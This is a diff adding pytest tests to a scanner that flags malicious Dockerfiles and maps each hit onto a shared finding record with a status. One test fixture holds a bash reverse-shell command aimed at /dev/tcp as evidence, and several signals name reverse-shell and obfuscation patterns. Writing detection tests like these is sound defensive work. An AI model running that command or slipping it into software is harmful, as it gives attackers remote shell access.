@@ -6,9 +6,11 @@ from unittest.mock import MagicMock
 
 import pytest
 
+from knorr.models import DetectionMethod, FindingStatus
 from knorr.scanning.dockerfile import (
     _BENCHMARK_CONTENT,
     DockerfileHit,
+    finding_from_hit,
     is_defensive,
     is_dockerfile,
     scan_dockerfiles,
@@ -236,3 +238,59 @@ def test_dockerfile_hit_fields():
     assert h.repo == "evil/backdoor"
     assert h.confirmed is True
     assert "reverse_shell/bash-tcp" in h.signals
+
+
+# ---------------------------------------------------------------------------
+# finding_from_hit: maps a DockerfileHit onto the shared ImageFinding record,
+# so a hit shows up in the same registry (dashboard, `knorr watch` alerts) as
+# a malicious image. Shared by cli.py's `knorr dockerfiles` and watch.py's
+# periodic dockerfile round.
+# ---------------------------------------------------------------------------
+
+def test_confirmed_hit_maps_to_confirmed_status():
+    hit = DockerfileHit(
+        repo="DVKunion/test_ci", path="Dockerfile",
+        url="https://github.com/DVKunion/test_ci/blob/abc/Dockerfile",
+        score=5, tier="A:reverse_shell", confirmed=True,
+        signals=["reverse_shell/bash-tcp"],
+        confirming=[{"category": "reverse_shell", "rule": "bash-tcp",
+                     "evidence": "bash -i >&/dev/tcp/1.2.3.4/80 0>&1"}])
+    f = finding_from_hit(hit)
+    assert f.status == FindingStatus.CONFIRMED
+    assert f.detection_method == DetectionMethod.DOCKERFILE_SCAN
+    assert f.image == "github.com/dvkunion/test_ci:dockerfile"
+    assert f.tier == "A:reverse_shell"
+    assert f.score == 5
+    assert f.confirming == hit.confirming
+    assert f.evidence["dockerfile_url"] == hit.url
+    assert f.publisher == "dvkunion"
+
+
+def test_unconfirmed_high_score_maps_to_screened():
+    hit = DockerfileHit(repo="org/repo", path="Dockerfile", url="https://x", score=6)
+    f = finding_from_hit(hit)
+    assert f.status == FindingStatus.SCREENED
+
+
+def test_unconfirmed_low_score_maps_to_candidate():
+    hit = DockerfileHit(repo="org/repo", path="Dockerfile", url="https://x", score=1)
+    f = finding_from_hit(hit)
+    assert f.status == FindingStatus.CANDIDATE
+
+
+def test_finding_image_key_is_reversible_to_repo_and_path():
+    """cli.py derives `known` for scan_dockerfiles by stripping the
+    "github.com/" prefix back to a "repo:path" key; the format must round-trip."""
+    hit = DockerfileHit(repo="Owner/Repo", path="docker/Dockerfile.prod", url="https://x")
+    f = finding_from_hit(hit)
+    assert f.image.startswith("github.com/")
+    stripped = f.image[len("github.com/"):]
+    assert stripped == "owner/repo:docker/dockerfile.prod"
+
+
+def test_finding_reasoning_includes_facets():
+    hit = DockerfileHit(repo="org/repo", path="Dockerfile", url="https://x",
+                        signals=["reverse_shell/bash-tcp", "obfuscation/eval-atob"])
+    f = finding_from_hit(hit)
+    assert "reverse_shell" in f.reasoning
+    assert "obfuscation" in f.reasoning
